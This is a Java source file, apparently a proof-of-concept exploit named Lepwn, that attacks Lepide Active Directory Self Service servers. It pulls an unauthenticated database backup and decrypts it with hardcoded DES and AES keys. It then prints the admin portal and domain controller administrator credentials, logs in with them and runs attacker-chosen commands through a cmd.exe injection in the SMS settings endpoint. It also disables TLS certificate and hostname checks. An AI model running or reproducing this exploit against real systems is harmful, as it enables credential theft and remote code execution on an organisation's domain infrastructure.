import java.io.InputStream;
import java.net.URL;
import java.security.Key;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.util.Base64;
import org.jsoup.Connection.Method;
import org.jsoup.Connection.Response;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;

public class Lepwn {
	
	  private static final byte[] keyValue = { 
			  
	      84, 104, 101, 66, 101, 115, 116, 83, 101, 99, 114, 101, 116, 75, 101, 121 }; //TheBestSecretKey 

	  public static void main(String[] args) throws Throwable {
		String InterfaceAdminUser = null;
		String InterfaceAdminPass = null;
	    Scanner scanner = new Scanner(System.in);
	    System.out.print("Enter Lepide URL you want to own: \n");
	    String lepideBaseURL = scanner.next();
	    
	    System.out.print("Enter Lepide Version: \n");
	    int lepideVersion = (new Integer(scanner.next())).intValue();

	    TrustManager[] trustAllCerts = { new X509TrustManager()
	        {
	          public X509Certificate[] getAcceptedIssuers() { return null; }
	          public void checkClientTrusted(X509Certificate[] certs, String authType) {}
	          public void checkServerTrusted(X509Certificate[] certs, String authType) {}
	        } };
	    SSLContext sc = SSLContext.getInstance("SSL");
	    sc.init(null, trustAllCerts, new SecureRandom());
	    HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
	    
	    HostnameVerifier allHostsValid = new HostnameVerifier() {
	        public boolean verify(String hostname, SSLSession session) {
	          return true;
	        }
	      };

	    
	    HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
	    URL website = new URL(lepideBaseURL + "/EnrollmentNotificationAction.do?method=Backup");
	    InputStream is = website.openStream();

	    DESKeySpec dks = new DESKeySpec("piechidelta".getBytes()); //archive encrypted with DES with key "piechidelta"
	    SecretKeyFactory skf = SecretKeyFactory.getInstance("DES");
	    SecretKey desKey = skf.generateSecret(dks);
	    Cipher cipher = Cipher.getInstance("DES");
	    cipher.init(2, desKey);
	    CipherInputStream cis = new CipherInputStream(is, cipher);

	    
	    ZipInputStream zis = new ZipInputStream(cis);
	    ZipEntry ze = zis.getNextEntry();
	    StringBuilder contentSQL = new StringBuilder();
	    byte[] buffer = new byte[1024];
	    int read = 0;
	    while ((read = zis.read(buffer, 0, 1024)) >= 0) {
	      contentSQL.append(new String(buffer, 0, read));
	    }

	    
	    String regexInterfaceLoginInfo = "`adss_admin_authentication` VALUES (\\(.*\\));";
	    String regexDomainInfo = "`adss_domain_configuration` VALUES (\\(.*\\));";
	    Pattern patternGetInterfaceLogin = Pattern.compile(regexInterfaceLoginInfo);
	    Matcher matcherGetInterfaceLogin = patternGetInterfaceLogin.matcher(contentSQL);
	    Pattern patternGetAdminDomain = Pattern.compile(regexDomainInfo);
	    Matcher matcherGetAdminDomain = patternGetAdminDomain.matcher(contentSQL);
	    String interfaceLoginInfo = new String();
	    String domainServerInfo = new String();
	    if (matcherGetInterfaceLogin.find())
	    {
	      interfaceLoginInfo = matcherGetInterfaceLogin.group(1);
	    }
	    if (matcherGetAdminDomain.find())
	    {
	      domainServerInfo = matcherGetAdminDomain.group(1);
	    }
	    String[] intLoginDetailsTemp = interfaceLoginInfo.split("\\)(,)\\(");
	    String[] domServerInfosTemp = domainServerInfo.split("\\)(,)\\(");
	    String[][] intLoginDetails = new String[intLoginDetailsTemp.length][3];
	    String[][] domServerInfos = new String[domServerInfosTemp.length][3];
	    
	    for (int i = 0; i < intLoginDetails.length; i++) {
	      intLoginDetails[i] = intLoginDetailsTemp[i].replace("(", "").replace(")", "").replace("'", "").split(",");
	    }
	    for (int i = 0; i < domServerInfos.length; i++) {
	      domServerInfos[i] = domServerInfosTemp[i].replace("(", "").replace(")", "").replace("'", "").split(",");
	    }

	    
	    if (lepideVersion >= 2018) {									//prior to LADSS v2018 no encryption was used and data could be extracted in clear-text
	      for (int i = 0; i < intLoginDetails.length; i++) {
	        for (int j = 0; j < intLoginDetails[i].length; j++) {
	          intLoginDetails[i][j] = decryptAES(intLoginDetails[i][j]); //Database data is encrypted with AES using key "TheBestSecretKey"
	        }
	      } 
	      for (int i = 0; i < domServerInfos.length; i++) {
	        for (int j = 0; j < domServerInfos[i].length; j++) {
	          domServerInfos[i][j] = decryptAES(domServerInfos[i][j]); //Database data is encrypted with AES using key "TheBestSecretKey"
	        }
	      } 
	    } 

	    
	    System.out.println("Interface login details: ");
	    for (int i = 0; i < intLoginDetails.length; i++) {
	      InterfaceAdminUser = intLoginDetails[i][0];
	      InterfaceAdminPass = intLoginDetails[i][1];
	      System.out.print("Admin portal username: "+InterfaceAdminUser+"\n");
	      System.out.print("Admin portal password: "+InterfaceAdminPass+"\n");
	    }
	    
	    System.out.println();
	    System.out.println();
	    System.out.println("Domain server details: ");
	    for (int i = 0; i < domServerInfos.length; i++) {
	      System.out.print("Domain Controller Admin user: "+domServerInfos[i][2]+"\n");
	      System.out.print("Domain Controller Admin password: "+domServerInfos[i][3]+"\n");
	      System.out.print("Domain Controller IP address: "+domServerInfos[i][4]+"\n");
	    }
	    System.out.print("Want to perform RCE? (y/n) \n");
	    String RCE = scanner.next();
	    if (RCE.equalsIgnoreCase("Y")) {
	    	System.out.print("Which command do you want to execute (Command Prompt)? \n ");
	    	scanner.nextLine();
	    	String CMD = scanner.nextLine();
	    	System.out.print("Going to attempt to run "+CMD+" command! \n");
	    	//initiate session
	    	Response resp = Jsoup.connect(lepideBaseURL + "/AdminLoginNew.jsp").method(Method.GET).execute();
	    	Document doc = resp.parse();
	    	String sessionId = resp.cookie("JSESSIONID");
	    	Element CSRF = doc.getElementById("csrfTokenUserId");
	    	
	    	//authentication
	    	Response resp2 = Jsoup.connect(lepideBaseURL + "/AdminLoginAction.do").cookie("JSESSIONID", sessionId).data("strUsername",InterfaceAdminUser, "strPassword", InterfaceAdminPass, "csrfToken", CSRF.attr("value"), "method", "Login").method(Method.POST).followRedirects(false).execute();
	    	Document doc2 = resp2.parse();
	    	String finalsessionId = resp2.cookie("JSESSIONID");
	    	if(resp2.statusCode() == 302) {
	    		System.out.print("Logged in!\n");
	    		System.out.print("Active sessioncookie is: "+finalsessionId+"\n");
	    	}else {
	    		System.out.print("Login failed!\n");
	    		System.out.print("Cookie used is: "+finalsessionId+"\n");

	    	}

	    	//RCE (command injection)
	    	String payload = "Custom Executable<<;>>../../../../../../../Windows//SysWow64//cmd.exe<<;>>/C "+ CMD +" & <<;>>";
	    	Response resp3 = Jsoup.connect(lepideBaseURL + "/SMSsetting.do").proxy("127.0.0.1", 8080).cookie("JSESSIONID", finalsessionId).data("method", "send_test_sms", "prop" ,payload).method(Method.POST).followRedirects(false).execute();
	    	Document doc3 = resp3.parse();
	    	System.out.print("Bombs away!\n");
	    }
	  }

	  public static String decryptAES(String encryptedData) {
	    try {
	      Key key = new SecretKeySpec(keyValue, "AES");
	      Cipher c = Cipher.getInstance("AES");
	      c.init(2, key);
	      byte[] decodedValue = Base64.getDecoder().decode(encryptedData);
	      byte[] decValue = c.doFinal(decodedValue);
	      return new String(decValue, "UTF8");
	    }
	    catch (Exception e) {
	      return "";
	    } 
	  }
}
